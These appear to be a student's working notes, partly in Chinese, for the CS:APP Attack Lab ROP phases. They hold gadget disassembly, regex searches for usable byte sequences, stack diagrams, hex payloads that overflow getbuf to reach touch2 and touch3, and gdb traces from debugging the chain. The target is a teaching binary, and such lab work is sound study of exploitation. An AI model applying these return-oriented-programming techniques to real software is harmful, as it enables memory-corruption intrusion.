tdraft

phase 5

0x004017ec <touch2>:
0x0040184c <hexmatch>:
0x004018fa <touch3>:

/* 40 bytes nop */
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90

# # movq %rsp, %rdi
# # ret
# # popq %rdi
# # ret

# # /* 48 89 ... */
# # 00000000004019a0 <addval_273>:
# #   4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
# #   4019a6:	c3                   	retq   
# 
# # 00000000004019ae <setval_237>:
# #   4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
# #   4019b4:	c3                   	retq   
# 
# # 00000000004019c3 <setval_426>:
# #   4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
# #   4019c9:	c3                   	retq   
# 
# # /* 89 */
# # 00000000004019db <getval_481>:
# #   4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
# #   4019e0:	c3                   	retq   
# 
# # 00000000004019e8 <addval_113>:
# #   4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
# #   4019ee:	c3                   	retq   
# 
# # /* 5f */

stack structure
+-----------------+
|   ret addr 3    |
|   ret addr 2    |
|    pop val      |
|   ret addr 1    |
+-----------------+
|  40-byte nops   |
+-----------------+
# Todo:
# I need a tool that can general raw code 
# according to the stack structure (and 
#   input startpoint)
 

+----------------------------+
|  00 00 00 00  00 40 17 ec  |  # <touch2>
|  00 00 00 00  00 40 19 c5  |  # 0x4019c5: movq %rax, %rdi [48 89 c7]
|  00 00 00 00  59 b9 97 fa  |  # cookie 0x59b997fa
|  00 00 00 00  00 40 19 ab  |  # 0x4019ab: popq %rax [58]
|  90 90 90 90  90 90 90 90  |
|  90 90 90 90  90 90 90 90  |
|  90 90 90 90  90 90 90 90  |
|  90 90 90 90  90 90 90 90  |
|  90 90 90 90  90 90 90 90  |
+----------------------------+

popq %rax [58]
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

movq %rax, %rdi [48 89 c7]
00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

# Todo:
# A tool can automatically select targeted 
# subsequnce from original instructions is
# preferred.

00 00 00 00  00 40 17 ec | ec 17 40 00  00 00 00 00  |
00 00 00 00  00 40 19 c5 | c5 19 40 00  00 00 00 00  |
00 00 00 00  59 b9 97 fa | fa 97 b9 59  00 00 00 00  |
00 00 00 00  00 40 19 ab | ab 19 40 00  00 00 00 00  |
90 90 90 90  90 90 90 90 | 90 90 90 90  90 90 90 90  |
90 90 90 90  90 90 90 90 | 90 90 90 90  90 90 90 90  |
90 90 90 90  90 90 90 90 | 90 90 90 90  90 90 90 90  |
90 90 90 90  90 90 90 90 | 90 90 90 90  90 90 90 90  |
90 90 90 90  90 90 90 90 | 90 90 90 90  90 90 90 90  |
-------------------------+--------------------------+
90 90 90 90  90 90 90 90
90 90 90 90  90 90 90 90
90 90 90 90  90 90 90 90
90 90 90 90  90 90 90 90
90 90 90 90  90 90 90 90
ab 19 40 00  00 00 00 00
fa 97 b9 59  00 00 00 00
c5 19 40 00  00 00 00 00
ec 17 40 00  00 00 00 00

1. af cd => cd af
2. 1/2 3/4 =>2/1 4/3

phase 6

run-time stack
+-------------
|
|  cookie address
|  injected cookie string |  # raw cookie string: 35 39 62 39 39 37 66 61 00
|  ret addr 1  |  <=> %rsp <=>
+--------------
|  40-byte nops
+-------------
ret
---
# 已经确保这些指令之后一定接着的是c3
# 我需要把下面这些事情给交给脚本来完成，打印出一下的内容，并且要完成更完善的检查
# 对于每一行字符串要完成不止一个的检查，确保所有可用的指令都在，并且之后不会受到影响（检查后续指令等等）
# 检查后续指令可能会存在一定的困难，先不作为当前脚本的内容，不过可以
popq  " 5[8-9a-f] "
4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax         # popq %rax [58]
4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax         # popq %rsp [5c]

movq  " 48 89 [c-f][0-f] "  # 经检查，不存在该组合之外换行成立的情形，因没有" 48 89  "字串出现
4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)

movl  " [^4][^8] 89 [c-f][0-f] "  # 必须不是movq
4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax

# Todo:
# automatically seletion is possible, since we can examine each line to determine whether the pattern exists
functional nop instructions
andb,orb,cmpb,testb  "(20|08|38|84)\s(c0|c9|d2|db)"
4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax   # andb  %bl 
4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)       # testb %al
401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)       # orb   %cl
401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax   # cmpb  %al
401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)       # orb   %bl
401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax         # cmpb  %cl
401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax   # 
401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax         # 
401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax         # 
401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)       # 
401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)       # 
401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax         # 
401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax         # 


# code
ret   <gadget_1>

popq  %rax          # get cookie addr
ret   <gadget_2>

movq  %rax,%rdi     # set it as param 1
ret   <touch_3>     # ret to touch 3

==injected_string_space==
# 考虑到这个题目应该是设计好的，直接应该是做不出来的，但我还是想先试试
# 刚想一两步就知道做不出来了。

run-time stack
+-------------
|
|  injected cookie string |  # raw cookie string: 35 39 62 39 39 37 66 61 00
|  ret addr 3  |
|  ret addr 2  |
|  cookie addr |
|  ret addr 1  |  <=> %rsp <=>
+--------------
|  40-byte nops
+-------------
impractical due to stack randomization
functional nop instructions
andb,orb,cmpb,testb  "(20|08|38|84)\s(c0|c9|d2|db)"
4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax   # andb  %bl 
4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)       # testb %al
401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)       # orb   %cl
401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax   # cmpb  %al
401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)       # orb   %bl
401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax         # cmpb  %cl
401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax   # 
401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax         # 
401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax         # 
401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)       # 
401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)       # 
401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax         # 
401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax         # 

popq  " 5[8-9a-f] "
4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax         # popq %rax [58]
4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax   # popq %rax [58]
4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)       # popq %rax [58]
4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax         # popq %rsp [5c]

movq  " 48 89 [c-f][0-f] "  # 经检查，不存在该组合之外换行成立的情形，因没有" 48 89  "字串出现
4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)       # movq %rax,%rdi
401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax   # movq %rsp,%rax
# 401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax   # movq %rsp,%rax
401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)       # movq %rsp,%rax

movl  " [^4][^8] 89 [c-f][0-f] "  # 必须不是movq
4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax         # movl %eax,%edx
401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax   # movl %ecx,%esi
401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax   # movl %ecx,%esi
401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax   # movl %eax,%edx
run-time stack
+-------------
|
|  injected cookie string |  # raw cookie string: 35 39 62 39 39 37 66 61 00
|  ret addr 3  |
|  ret addr 2  |
|  cookie addr |
|  ret addr 1  |  <=> %rsp <=>
+--------------
|  40-byte nops
+-------------
# 目前看来，一个办法是直接让栈指针的内容pop出来，这时原本栈顶的内容就是字符串，等一下，
# 这么做没有意义，字符串就该放在栈里面不动的。也就是说，字符串本身应该存在所有指令的后面
# 除非一开始就能想办法跳过字符串的位置，也有办法，(这里先停，根据修改的指令集重新思考)
# |  
# |  cur rsp + 3  |
# |  ret addr 2  |
# |    |  <=> %rsp <=> # mov %rsp,%rax
# |  ret addr 1  |

可能需要重新整理一下指令集，加上这个修改过的模式串， " (\s|90\s{2,}|(20|08|38|84)\s(c0|c9|d2|db))"
movq  "48 89 [c-f][0-f] (\s|90 |(20|08|38|84)\s(c0|c9|d2|db))"
4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)

movl  "([^4][^8]|[4][^8]|[^4][8]) 89 [c-f][0-f] (\s|90 |(20|08|38|84)\s(c0|c9|d2|db))"
4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax

popq  "5[8-9a-f] (\s|90 +|((20|08|38|84)\s(c0|c9|d2|db)))"
4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax

还是不对，这个过滤规则过强了，问题是可以同时执行两条指令的。重来

" \d{0,2} 89 [c-f][0-f] | 5[8-9a-f] "
"\d{2} (\s*|(90\s+)|()#"
有效的结尾：
\s{2}#
90\s{2}#
"(( 5[8-9a-f])|( \d{0,2} 89 [c-f][0-f])|(\s+| c3| 90| (20|08|38|84) (c0|c9|d2|db)))\s{2}#"
4019a0:	8d 87 48 89 c7 c3  # [48 89 c7]movq %rax,%rdi  
4019a7:	8d 87 51 73 58 90  # [58]popq %rax
4019ae:	c7 07 48 89 c7 c7  # [48 89 c7]movq %rax,%rdi x
4019b5:	c7 07 54 c2 58 92  # [58]popq %rax
4019c3:	c7 07 48 89 c7 90  # [48 89 c7]movq %rax,%rdi  
4019ca:	b8 29 58 90 c3     # [58]popq %rax
4019db:	b8 5c 89 c2 90     # [89 c2]movl %eax,%edx     [5c]popq %rsp
4019e8:	8d 87 89 ce 78 c9  # [89 ce]movl %ecx,%esi    x
401a03:	8d 87 41 48 89 e0  # [48 89 e0]movq %rsp,%rax  
401a11:	8d 87 89 ce 90 90  # [89 ce]movl %ecx,%esi     
401a18:	b8 48 89 e0 c1     # [48 89 e0]movq %rsp,%rax x
401a1e:	8d 87 89 c2 00 c9  # [89 c2]movl %eax,%edx    x
401a25:	8d 87 89 ce 38 c0  # [89 ce]movl %ecx,%esi     
401a40:	8d 87 89 c2 84 c0  # [89 c2]movl %eax,%edx     
401a47:	8d 87 48 89 e0 c7  # [48 89 e0]movq %rsp,%rax x
401a5a:	c7 07 48 89 e0 91  # [48 89 e0]movq %rsp,%rax x
401a61:	8d 87 89 ce 92 c3  # [89 ce]movl %ecx,%esi    x
401a6e:	c7 07 89 d1 91 c3  # [89 d1]movl %edx,%ecx    x
401a83:	8d 87 08 89 e0 90  # [89 e0]movl %esp,%eax     
401a8a:	8d 87 89 c2 c7 3c  # [89 c2]movl %eax,%edx    x
401a97:	c7 07 48 89 e0 c2  # [48 89 e0]movq %rsp,%rax x
401a9e:	8d 87 89 c2 60 d2  # [89 c2]movl %eax,%edx    x
401aab:	c7 07 48 89 e0 90  # [48 89 e0]movq %rsp,%rax  

艹，把我自己绕进去了，先人眼识别出来吧，不用正则表达式筛查了，就这么几十条
应该把所有的字符串根据c3打断（作为末尾），然后从字串中寻找匹配的
我感觉这应该是某个算法能解决的问题
4019a0:	8d 87 48 89 c7 c3  # [48 89 c7]movq %rax,%rdi  
4019a7:	8d 87 51 73 58 90  # [58]popq %rax
4019b5:	c7 07 54 c2 58 92  # [58]popq %rax
4019c3:	c7 07 48 89 c7 90  # [48 89 c7]movq %rax,%rdi  
4019ca:	b8 29 58 90 c3     # [58]popq %rax
4019db:	b8 5c 89 c2 90     # [89 c2]movl %eax,%edx     [5c]popq %rsp
401a03:	8d 87 41 48 89 e0  # [48 89 e0]movq %rsp,%rax  
401a11:	8d 87 89 ce 90 90  # [89 ce]movl %ecx,%esi     
401a25:	8d 87 89 ce 38 c0  # [89 ce]movl %ecx,%esi     
401a40:	8d 87 89 c2 84 c0  # [89 c2]movl %eax,%edx     
401a83:	8d 87 08 89 e0 90  # [89 e0]movl %esp,%eax     
401aab:	c7 07 48 89 e0 90  # [48 89 e0]movq %rsp,%rax  
401a68:	b8 89 d1 08 db     # []漏网之鱼movl %edx,%ecx
401a33:	b8 89 d1 38 c9     

# Todo: 字符串处理工具和一些函数使用

我感觉这道题实在是反直觉。我觉得可能真的需要把字符串当做整数来操作移动
如果当前指令是pop，当前%rsp指针只能非gadget地址；
如果当前指令是mov，当前%rsp指针只能是gadget地址
在执行pop之前执行mov没有意义，因为没有有效数值，即使执行mov %rsp,...的指令，没有意义

35 39 62 39 39 37 66 61 00  # cookie 
00 61 66 37 39 39 62 39 35

问题是，我不知道在哪里存字符串，我不知道在哪里写下指向字符串的指针，地址是不确定的，必然是要从rsp获得
但是，我只能获得rsp当前位置的指针，并且是使用movq，但是又有的问题是，当前位置必须是gadget地址，这里推
出了矛盾。如果前面的论证没有错，那就只能是用pop，但是在当前位置下如果是字符串，pop所得结果应当是无意义
的，这是一段二进制表示，但是不是指针。前后矛盾了。那么就要假设直接从rsp获得字符串指针的思路是错误的。
但是，又有前面的论证得知，字符串指针只能从rsp直接获得（因为不能相加减），所以我只能认为我整理的表格是错的。

根本的矛盾点是，如果获取字符串指针，只能使用rsp，意味着必须使用mov rsp,...，这会导致当前位置必须是gadget
地址，这和我假设当前位置是字符串矛盾。这一论证的矛盾，还基于"一个gadget中只能执行一个指令"的假设，也就是
这个假设必然是不成立的。那么，我必须在一个gadget中使用多个指令，那么我的出来的指令集就是错的。

movq
movl
popq
草，我一直写的0-f，可能筛选错了。妈的，竟然是正则写错了。不是，不影响结果。

艹，你可以用它原来的代码啊，非得他妈的去用什么gadget造，硬生生的把自己的代码限制在只能使用mov和pop
妈的，他妈的，这里是从头到尾忽略的东西

能用的必然是不是具体数值的指令，也就只有这一条
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

# %rax <= %rdi + %rsi
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

我明天必须好好记录一下把所有的路都排除之后无可奈何的查资料的感觉。
run-time stack
+--------------+  虽然比答案似乎多了一个指令，也能接受，做出来了就行
|  ret addr 9  |  movq  %rax,%rdi
|  ret addr 8  |  lea   (%rdi,%rsi,1),%rax
|  ret addr 7  |  movl  %ecx,%esi 
|  ret addr 6  |  movl  %edx,%ecx  # 
|  ret addr 5  |  movl  %eax,%edx
|     0x2      |  popq  %rax  # 加2也不对
|  ret addr 4  |  
|  cookie str  |  popq  %rax 
|  ret addr 3  |  movq  %rax,%rdi  # rdi=rsp
|  ret addr 2  |  movq  %rsp,%rax
|  ret addr 1  |  
+--------------+
|  40-byte zeros
+--------------+

run-time stack  
+--------------+ # 想出最优解了，8个
|  cookie str  |  9*0x8
|  0x004018fa  |  movq  %rax,%rdi
|  0x4019a7+4  |  lea   (%rdi,%rsi,1),%rax
|  0x4019d6+0  |  movl  %ecx,%esi 
|  0x401a11+2  |  movl  %edx,%ecx  # 
|  0x401a33+1  |  movl  %eax,%edx
|  0x4019db+2  |  
|    9*0x8     |  popq  %rax
|  0x4019a7+4  |  movq  %rax,%rdi  # rdi=rsp
|  0x4019a0+2  |  movq  %rsp,%rax
|  0x401aab+2  |  
+--------------+
|  40-byte zeros
+--------------+




00 00 00 00  00 40 18 fa | fa 18 40 00  00 00 00 00
00 00 00 00  00 40 19 ab | ab 19 40 00  00 00 00 00
00 00 00 00  00 40 19 d6 | d6 19 40 00  00 00 00 00
00 00 00 00  00 40 1a 13 | 13 1a 40 00  00 00 00 00
00 00 00 00  00 40 1a 34 | 34 1a 40 00  00 00 00 00
00 00 00 00  00 40 19 dd | dd 19 40 00  00 00 00 00
00 00 00 00  00 00 00 02 | 02 00 00 00  00 00 00 00
00 00 00 00  00 40 19 ab | ab 19 40 00  00 00 00 00



35 39 62 39 39 37 66 61 00  /* cookie */
00 61 66 37  39 39 62 39 35




00 00 00 00  00 40 19 ab | ab 19 40 00  00 00 00 00
00 00 00 00  00 40 19 a2 | a2 19 40 00  00 00 00 00
00 00 00 00  00 40 1a ad | ad 1a 40 00  00 00 00 00

ad 1a 40 00  00 00 00 00
a2 19 40 00  00 00 00 00
ab 19 40 00  00 00 00 00
35 39 62 39  39 37 66 61
00 00 00 00  00 00 00 00  /* cookie */
ab 19 40 00  00 00 00 00
02 00 00 00  00 00 00 00
dd 19 40 00  00 00 00 00
34 1a 40 00  00 00 00 00
13 1a 40 00  00 00 00 00
d6 19 40 00  00 00 00 00
ab 19 40 00  00 00 00 00
fa 18 40 00  00 00 00 00


# (gdb) disas
# Dump of assembler code for function getbuf:
#    0x00000000004017a8 <+0>:     sub    $0x28,%rsp
#    0x00000000004017ac <+4>:     mov    %rsp,%rdi
#    0x00000000004017af <+7>:     callq  0x401b60 <Gets>
#    0x00000000004017b4 <+12>:    mov    $0x1,%eax
#    0x00000000004017b9 <+17>:    add    $0x28,%rsp
# => 0x00000000004017bd <+21>:    retq
# End of assembler dump.
# (gdb) stepi
# 0x0000000000401aad in setval_350 ()
# (gdb) x/x $rsp
# 0x7fffffff2d50: 0x004019a2
# (gdb) stepi
# 0x0000000000401ab0 in setval_350 ()
# (gdb) x/x $rsp
# 0x7fffffff2d50: 0x004019a2
# (gdb) stepi
# 0x0000000000401ab1 in setval_350 ()
# (gdb) x/x $rsp
# 0x7fffffff2d50: 0x004019a2
# (gdb) stepi
# 0x00000000004019a2 in addval_273 ()
# (gdb) x/x $rsp
# 0x7fffffff2d58: 0x004019ab
# (gdb) stepi
# 0x00000000004019a5 in addval_273 ()
# (gdb) x/x $rsp
# 0x7fffffff2d58: 0x004019ab
# (gdb) stepi

Breakpoint 4, 0x00000000004019ab in addval_219 ()
(gdb) x/x $rsp
0x7fffffff2d60: 0x00000048
(gdb) stepi
0x00000000004019ac in addval_219 ()
(gdb) x/x $rsp
0x7fffffff2d68: 0x004019dd
(gdb) stepi
0x00000000004019ad in addval_219 ()
(gdb) x/x $rsp
0x7fffffff2d68: 0x004019dd
(gdb) stepi
0x00000000004019dd in getval_481 ()
(gdb) x/x $rsp
0x7fffffff2d70: 0x00401a34
(gdb) stepi

0x7fffffff2d88: 0x004019ab
(gdb) stepi

Breakpoint 4, 0x00000000004019ab in addval_219 () 指令写错，错用为pop
(gdb) x/x $rsp
0x7fffffff2d90: 0x004018fa
(gdb) stepi
0x00000000004019ac in addval_219 ()
(gdb) x/x $rsp
0x7fffffff2d98: 0x39623935
(gdb)